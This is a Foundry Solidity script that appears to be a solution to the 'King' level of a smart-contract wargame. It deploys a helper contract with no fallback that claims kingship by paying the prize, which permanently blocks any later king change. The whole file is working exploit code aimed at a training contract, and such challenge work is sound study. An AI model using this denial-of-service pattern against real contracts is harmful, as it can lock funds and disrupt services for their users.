// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/King.sol";


contract j
{
    address public owner;
    constructor (King kingin) payable
        {
            address(kingin).call{value : kingin.prize()}("");
        }

}

contract Level9Solution is Script
{

King public king = King(payable(0xD579883b15f3695b22e123218fE08e61a30b8987));

function run() external
    {
       
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        new j{value : king.prize()}(king);

        console.log("king = ", king._king());
        vm.stopBroadcast();
    }

}

